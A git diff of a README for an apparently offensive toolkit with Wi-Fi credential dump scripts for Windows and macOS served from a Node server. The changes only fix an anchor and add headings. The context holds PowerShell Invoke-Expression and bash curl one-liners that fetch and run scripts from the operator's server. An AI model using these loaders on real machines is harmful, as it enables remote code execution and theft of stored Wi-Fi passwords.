@@ -27,7 +27,7 @@ This project is for educational purposes and not to be used maliciously. This is
   - [wifiDump.ps1](#wifidumpps1)
   - [wifiDumpMac.sh](#wifidumpmacsh)
 - [Execution](#execution)
-  - [Starting the Server](#to-start-the-server)
+  - [Starting the Server](#starting-the-server)
   - [Installing pm2 (Optional)](#installing-pm2-is-optional)
   - [Manually Running Scripts](#manually-running-scripts)
     - [PowerShell](#powershell)
@@ -192,10 +192,14 @@ pm2 start server.js --name pickAServerName
 
 After the server is running you can manually call a script make sure ipaddress and scriptname are updated(ipaddress can be updated automatically with setup.py), then enter the above code in to PowerShell. The below code can be found in the powerShell folder file named launchPsScript.ps1
 
+#### powershell
+
 ```powershell
 Invoke-Expression ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://<ipaddress>:3002/scripts/<scriptname>.ps1" -UseBasicParsing).Content))
 ```
 or
+
+#### Bash
 
 ```Bash
 bash -c "$(curl -fsSL http://<ipaddress>:3002/<scriptName.sh>)"
